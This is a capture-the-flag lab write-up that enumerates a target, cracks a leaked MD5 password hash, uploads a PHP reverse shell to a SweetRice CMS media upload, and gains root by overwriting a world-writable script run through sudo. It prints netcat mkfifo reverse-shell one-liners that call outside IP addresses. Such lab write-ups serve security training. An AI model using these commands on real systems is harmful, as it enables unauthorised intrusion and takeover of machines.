# UltraTech

This lab's focus is to train my Privilege Escalation skills in Linux. Let's start!

### Nmap Enumeration

```
nmap -A -p- <ip>
```

> PORT   STATE SERVICE VERSION
> 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
> | ssh-hostkey: 
> |   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
> |   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
> |_  256 61846227c6c32917dd27459e29cb905e (ED25519)
> 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
> |_http-title: Apache2 Ubuntu Default Page: It works
> |_http-server-header: Apache/2.4.18 (Ubuntu)
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

SSH and HTTP open.

### HTTP Port

Opening the website showcases Apache's default installation page. Let's scan the target using gobuster for additional directories.

![image-20230805132139930](./images/image-20230805132139930.png)

We find /content which mentions the Basic CMS: Sweetrice.

Manual enumeration in the inc folder or checking https://www.exploit-db.com/exploits/40718 points to a backup of the SQL database which is downloadable.

For some reason I was not being able to open this file with sqlitebrowser. Nonetheless, using `cat` or `strings` I was able to recover a username and a password for the /as login page.

![image-20230805131958010](./images/image-20230805131958010.png)

The above hash is MD5 and can be cracked with:

```
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

42f749ade7f9e195bf475f37a44cafcb:Password123



### Foothold

Now that we are in the dashboard panel we can perform an exploit manually or automatically to get a reverse shell. You should try to upload a php reverse shell into the "Media Center" option. You can get one from [pentestmonkey's Github](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).

You will see that when the file is uploaded nothing happens. If you upload a .txt filee it should be added to the list of files above. You can search online for other php extensions to use, php5 worked for me.

![image-20230805134704939](./images/image-20230805134704939.png)

Press the file and you can a shell.

### Privilege Escalation

This part was somewhat easy. As user `www-data` we can run one command without a password.

```
sudo -l
```

> User www-data may run the following commands on THM-Chal:
>     (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

```
cat /home/itguy/backup.pl
```

> #!/usr/bin/perl
>
> system("sh", "/etc/copy.sh");

```
cat /etc/copy.sh
```

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

```
ls -la /etc/copy.sh
```

> -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh

Basically how we are going to get root involves using the command above with sudo, which executes the /etc/copy.sh

Since we have write privileges on this file we can run anything as root. So I changed the already existing reverse shell there to one with my IP and my Port and executed the sudo command with a listener on port 5555 on my end.

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.56.235 5555 >/tmp/f" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

We got root!
